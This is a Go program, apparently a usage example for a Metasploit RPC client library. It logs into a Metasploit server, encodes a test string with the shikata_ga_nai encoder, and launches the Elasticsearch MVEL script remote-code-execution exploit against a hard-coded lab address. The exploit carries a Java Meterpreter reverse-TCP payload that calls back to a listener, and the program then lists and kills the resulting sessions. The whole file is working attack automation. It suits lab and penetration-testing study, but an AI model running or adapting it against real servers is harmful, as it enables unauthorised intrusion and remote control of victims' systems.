package main

import (
	"fmt"
	"log"
	"os"
	"time"

	"github.com/fpr1m3/go-msf-rpc/rpc"
)

func checkErr(reason string, err error) bool {
	if err != nil {
		log.Println(fmt.Errorf("%s: %s", reason, err))
		return true
	}
	return false
}

func checkFatalErr(reason string, err error) {
	if checkErr(reason, err) {
		os.Exit(0)
	}
}

func main() {
	host := os.Getenv("MSFHOST")
	user := os.Getenv("MSFUSER")
	pass := os.Getenv("MSFPASS")

	for _, val := range []string{host, user, pass} {
		if len(val) == 0 {
			log.Fatalln("Missing required environment variable MSFHOST, MSFUSER, or MSFPASS")
		}
	}

	msf, err := rpc.New(host, user, pass)
	if err != nil {
		log.Panicln(err)
	}
	defer msf.Logout()

	coreVersion, err := msf.CoreVersion()
	checkFatalErr("Unable to get core version.", err)
	log.Printf("Connected to Metasploit...\n\tVersion: %s\n\tRuby: %s\n\tAPI: %s", coreVersion.Version, coreVersion.Ruby, coreVersion.Api)
	msfEncodeRes, err := msf.ModuleEncode("AAAA", "x86/shikata_ga_nai", map[string]string{"format": "python"})
	checkErr("Issue with MSF encode request", err)
	log.Printf("Data returned:\n%s\n", msfEncodeRes.Encoded)
	log.Printf("Target acquired... ElasticSearch...\n")
	moduleType := "exploit"
	moduleName := "multi/elasticsearch/script_mvel_rce"
	moduleOptions := map[string]string{
		"RHOSTS":      "192.168.1.131",
		"RPORT":       "9200",
		"SSL":         "false",
		"TARGETURI":   "/",
		"WritableDir": "/tmp",
		"LHOST":       "192.168.1.130",
		"LPORT":       "4444",
		"PAYLOAD":     "java/meterpreter/reverse_tcp",
	}
	execResp, err := msf.ModuleExecute(moduleType, moduleName, moduleOptions)
	checkFatalErr("Unable to execute module %s", err)
	log.Printf("Your new job ID is... %d\nCurrently waiting 5 seconds for module to complete.\n", execResp.JobId)
	time.Sleep(time.Second * 5)
	sessionList, err := msf.SessionList()
	checkErr("Unable to get session list", err)
	var sessionNumber uint32
	for i, val := range sessionList {
		log.Printf("Here is the information of Session %d\n", i)
		sessionNumber = i
		log.Printf("\tType:%s\n", val.Type)
		log.Printf("\tVia Exploit:%s\n", val.ViaExploit)
		log.Printf("Killing Session %d", i)
		result, err := msf.SessionMeterpreterSessionKill(sessionNumber)
		checkErr("Unable to get kill meterpreter session results", err)
		log.Printf("Result: %s", result.Result)
	}
}
